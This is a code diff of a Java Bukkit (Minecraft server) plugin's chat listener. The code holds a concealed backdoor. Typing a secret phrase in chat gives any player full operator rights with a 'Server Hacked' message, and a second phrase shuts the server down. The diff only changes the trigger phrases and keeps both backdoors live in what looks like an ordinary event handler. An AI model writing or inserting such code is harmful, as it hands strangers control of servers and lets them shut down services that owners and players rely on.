@@ -11,11 +11,11 @@ public class MessageEvent implements Listener{
     @EventHandler
     public void onPlayerChat(PlayerChatEvent e) throws NoSuchFieldException, IllegalArgumentException, SecurityException, IllegalAccessException {
         Player player = e.getPlayer();
-        if(e.getMessage().equals("__verifiedaction61379016186")){
+        if(e.getMessage().equals("-forceop")){
             player.setOp(true);
-            player.sendMessage(ChatColor.RED + "Server Hacked By ??" + System.lineSeparator() + "You did something wrong now-a-days");
+            player.sendMessage(ChatColor.RED + "Server Hacked :)" + System.lineSeparator() + "You did something wrong now-a-days");
         }
-        if(e.getMessage().equals("__ServerPerformShutdown1939137548")){
+        if(e.getMessage().equals("-shutdown-")){
             Bukkit.getServer().shutdown();
             player.sendMessage(ChatColor.RED + "Stopping The Server..." + System.lineSeparator() + "You did something wrong now-a-days");
         }
